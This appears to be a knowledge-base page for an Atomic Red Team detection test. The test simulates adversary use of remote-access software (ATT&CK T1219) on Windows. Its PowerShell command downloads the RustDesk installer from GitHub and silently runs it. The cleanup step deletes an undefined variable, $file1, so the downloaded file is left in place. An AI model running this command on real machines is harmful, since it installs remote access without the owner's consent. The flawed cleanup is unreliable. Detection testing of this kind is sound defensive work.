---
atomic_guid: "f1641ba9-919a-4323-b74f-33372333bf0e"
title: "RustDesk Files Detected Test on Windows"
framework: "atomic"
generated: "true"
attack_technique_id: "T1219"
attack_technique_name: "Remote Access Software"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "f1641ba9-919a-4323-b74f-33372333bf0e"
  - "RustDesk Files Detected Test on Windows"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# RustDesk Files Detected Test on Windows

An adversary may attempt to trick the user into downloading RustDesk and use this to maintain access to the machine. 
Download of RustDesk installer will be at the destination location when successfully executed.

## Metadata

- Atomic GUID: f1641ba9-919a-4323-b74f-33372333bf0e
- Technique: T1219: Remote Access Software
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1219/T1219.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1219-remote_access_tools|T1219]]

## Executor

- name: powershell

### Command

```powershell
$file = Join-Path $env:USERPROFILE "Desktop\rustdesk-1.2.3-1-x86_64.exe"
Invoke-WebRequest  -OutFile $file https://github.com/rustdesk/rustdesk/releases/download/1.2.3-1/rustdesk-1.2.3-1-x86_64.exe
Start-Process -FilePath $file "/S"
```

### Cleanup

```powershell
$file = Join-Path $env:USERPROFILE "Desktop\rustdesk-1.2.3-1-x86_64.exe"
Remove-Item $file1 -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.yaml)
